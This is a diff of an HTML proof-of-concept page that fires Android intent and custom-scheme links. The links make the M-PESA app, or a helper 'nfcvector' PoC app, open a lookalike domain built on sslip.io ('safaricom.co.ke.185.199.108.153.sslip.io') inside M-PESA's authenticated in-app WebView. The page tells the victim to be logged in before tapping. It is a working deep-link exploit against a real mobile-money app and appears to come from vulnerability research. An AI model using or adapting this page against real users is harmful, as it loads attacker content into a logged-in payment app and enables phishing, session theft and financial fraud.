@@ -53,11 +53,23 @@
             padding: 16px 20px;
             border-radius: 6px;
             text-decoration: none;
-            margin-top: 20px;
+            margin-top: 16px;
             box-shadow: 0 2px 8px rgba(0, 166, 81, 0.4);
         }
         .launch-btn:hover {
             background-color: #008f45;
+        }
+        .launch-btn-alt {
+            display: block;
+            background-color: #1e293b;
+            color: #38bdf8;
+            border: 1px solid #334155;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 12px 16px;
+            border-radius: 6px;
+            text-decoration: none;
+            margin-top: 12px;
         }
     </style>
 </head>
@@ -67,10 +79,14 @@
         <div class="notice">
             <strong>Prerequisite:</strong> Ensure M-PESA is logged in on the device before tapping the button below.
         </div>
-        <p>Tap the button below to launch the in-app WebView via the browsable <code>fintechoneapp</code> router:</p>
+        <p>Tap the button below to launch the diagnostic page directly inside M-PESA's authenticated in-app WebView:</p>
         
-        <a class="launch-btn" href="intent:///webViewModule/webview?scheme_execute_key=https%3A%2F%2Fsafaricom.co.ke.185.199.108.153.sslip.io%2F%3Fv%3D4#Intent;scheme=fintechoneapp;package=com.safaricom.mpesa.lifestyle;end">
+        <a class="launch-btn" href="intent://launch?route=https%3A%2F%2Fsafaricom.co.ke.185.199.108.153.sslip.io%2F%3Fv%3D4#Intent;scheme=mpesapoc;package=com.poc.nfcvector;end">
             🚀 Open M-PESA In-App WebView
+        </a>
+
+        <a class="launch-btn-alt" href="mpesapoc://launch?route=https%3A%2F%2Fsafaricom.co.ke.185.199.108.153.sslip.io%2F%3Fv%3D4">
+            Direct Custom Scheme Trigger
         </a>
     </div>
 </body>
